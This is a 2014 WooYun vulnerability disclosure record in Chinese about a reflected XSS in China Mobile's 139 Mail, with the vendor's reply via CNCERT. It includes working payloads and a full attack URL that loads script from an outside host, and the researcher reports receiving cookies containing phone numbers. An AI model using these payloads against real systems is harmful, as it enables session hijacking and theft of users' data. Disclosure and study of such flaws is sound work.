{"id": 57860, "wybug_id": "wooyun-2014-053061", "wybug_title": "中国移动139邮箱反射型XSS", "wybug_corp": "中国移动", "wybug_author": "超威蓝猫", "wybug_date": "2014-03-07 23:39", "wybug_open_date": "2014-04-21 23:40", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-21：\t细节向公众公开  简要描述： 中国移动139邮箱反射型XSS 一定条件触发 （一直挖不出139邮箱的XSS 这回终于满足了.. 详细说明：  139邮箱首页中 showSimpleLink() 函数使用了innerHTML对页面进行修改\n\n一目了然，这里的sid是通过URL传入的，并且js语句中没有任何转义或是过滤我们传入如下sid:\n\"><img src=1 onerror=alert(1)>\n\n\n看上去这里sid遇到等号 = 就不对劲了，我们将等号URI编码试试:\n\"><img src%3d1 onerror%3dalert(1)>\n\n\n成功啦。调用远端JS:\nhttp://appmail.mail.10086.cn/m2012/html/index.html?sid=\"><img/onerror%3djQuery.getScript(%27//qqq.si/dsvlL2%27) src%3d1>\n\n\nXSS收信平台收到的cookie还包含手机号哦:\n\n但是从第一张图可以看到，showSimpleLink()函数是延迟10秒执行\nsetTimeout(showSimpleLink,10000);\n所以这个XSS略显鸡肋。(但还是修一修吧..   漏洞证明：  如上。   修复方案：  我挖过很多邮箱的XSS，中国移动的139邮箱简直算是最坚固的一个，或许是我技艺不够吧..   版权声明：转载请注明来源 超威蓝猫@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-03-12 14:58 厂商回复： 对基础电信企业邮箱系统存储型XSS风险，已经转由CNCERT直接通报给基础电信企业集团公司，并建议其在邮件系统中继续加强防范同类问题。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-28 16:52 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  139邮箱确实挺难搞的，甚至比网易这些难搞，这个是网易和QQ的结合体。洞主这个洞貌似我以前发现的仍在那儿了    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}